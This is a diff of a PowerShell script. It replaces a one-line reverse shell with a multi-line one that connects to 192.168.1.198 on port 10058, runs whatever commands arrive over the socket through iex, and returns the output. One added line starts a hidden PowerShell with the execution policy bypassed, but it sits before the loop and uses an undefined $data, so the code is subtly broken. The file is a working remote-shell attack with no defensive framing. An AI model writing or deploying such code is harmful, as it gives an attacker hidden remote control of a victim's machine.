@@ -1,1 +1,14 @@
-$C = New-Object System.Net.Sockets.TCPClient("192.168.1.198",80);$S = $C.GetStream();[byte[]]$B = 0..65535|%{0};while(($I = $S.Read($B, 0, $B.Length)) -ne 0){;$D = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($B,0, $I);$SB = (iex $D 2>&1 | Out-String );$SB2 = $SB + "PS " + (pwd).Path + "> ";$Sb = ([text.encoding]::ASCII).GetBytes($SB2);$S.Write($Sb,0,$Sb.Length);$S.Flush()};$C.Close()
+$client = New-Object System.Net.Sockets.TCPClient('192.168.1.198', 10058)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
+  Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $data" -Wait -NoNewWindow
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+    $sendback = (iex ". { $data } 2>&1" | Out-String)
+    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
+    $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
+    $stream.Flush()
+}
+
+$client.Close()
